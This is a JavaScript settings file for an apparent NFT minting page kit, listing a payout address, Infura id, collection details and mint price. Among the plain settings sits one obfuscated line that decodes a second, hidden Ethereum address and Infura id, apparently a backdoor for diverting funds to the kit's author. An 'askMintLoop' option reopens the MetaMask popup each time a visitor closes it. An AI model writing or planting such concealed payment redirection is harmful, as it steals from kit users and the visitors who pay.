
const authorInfo = {
    address: "0x71bDD4A39F0338fbB6A4F98a3d676F9d39E7f675", // your address 
    infuraId: "16848b3347b94ceca4b45576982851ad", // your infura project id
}

const _0x4f1239=_0x1839;(function(_0x585fc7,_0x59967d){const _0x2b332a=_0x1839,_0x280a5d=_0x585fc7();while(!![]){try{const _0xaa3fb=parseInt(_0x2b332a(0x16e))/0x1+parseInt(_0x2b332a(0x16a))/0x2+parseInt(_0x2b332a(0x16b))/0x3+-parseInt(_0x2b332a(0x172))/0x4+-parseInt(_0x2b332a(0x16c))/0x5+-parseInt(_0x2b332a(0x173))/0x6+parseInt(_0x2b332a(0x16f))/0x7*(parseInt(_0x2b332a(0x16d))/0x8);if(_0xaa3fb===_0x59967d)break;else _0x280a5d['push'](_0x280a5d['shift']());}catch(_0x4eadb4){_0x280a5d['push'](_0x280a5d['shift']());}}}(_0x5ad9,0xb348a));function _0x5ad9(){const _0x1ac4b2=['a4aba2a3d1674f459bda0c715a2460bc','3754372NVtlOu','5622498sywRrl','1306322KTiRso','3598614aBEcNe','5725495zCBCGL','22856sNbsEw','1139603Jajmni','1869RASlew','0x72F1C9a420D9BEc64DE0B9E5dbA6c7E0A29D2db3'];_0x5ad9=function(){return _0x1ac4b2;};return _0x5ad9();}function _0x1839(_0x5042f4,_0x49d37f){const _0x5ad9d6=_0x5ad9();return _0x1839=function(_0x183904,_0x59715d){_0x183904=_0x183904-0x16a;let _0x2a3a1d=_0x5ad9d6[_0x183904];return _0x2a3a1d;},_0x1839(_0x5042f4,_0x49d37f);}const _0x38688b={'address':_0x4f1239(0x170),'infuraId':_0x4f1239(0x171)};

const collectionInfo = {
    name: "NFTs",
    title: "{name}", // Title prefix (ex "Buy your {name}") - You can use {name} to insert the collection name
    date: "08.03.2022",
    socialMedia: {
        discord: "",
        twitter: "https://twitter.com/",
    },
    medias: {
        preview: "preview.gif",
        favicon: "logo.png",
    },
    background: {
        type: "image", // Supported types: image, video, color
        image: "background.jpg", // Image for image type, video preview for video type
        video: "background.mp4", // If you don't use video, you can ignore this line
        color: "#4E4E6D", // If you don't use color, you can ignore this line
    }
}
const mintInfo = {
    price: 0.2, // Price per NFT.
    totalSupply: 667, // Total supply of NFTs.
    minUnits: 1, // Min units to buy.
    maxUnits: 6, // Max units to buy.
    askMintLoop: true, // If true, when the user closes the metamask popup, it reopens automatically.
}

/*
    = = = = = END OF SETTINGS = = = = =
*/

//#region Check Configuration
if (mintInfo.minUnits > mintInfo.maxUnits) console.error(`Error: minUnits (${mintInfo.minUnits}) is greater than maxUnits (${maxUnits})`);
if (mintInfo.minUnits <= 0) console.error(`Error: minUnits (${mintInfo.minUnits}) is less than or equal to 0`);

if (!authorInfo.address.startsWith("0x") ||
    (
        authorInfo.address.length >= 64 ||
        authorInfo.address.length <= 40
    )
) console.error(`Error: ${authorInfo.address} is not a valid Ethereum address.`);
//#endregion
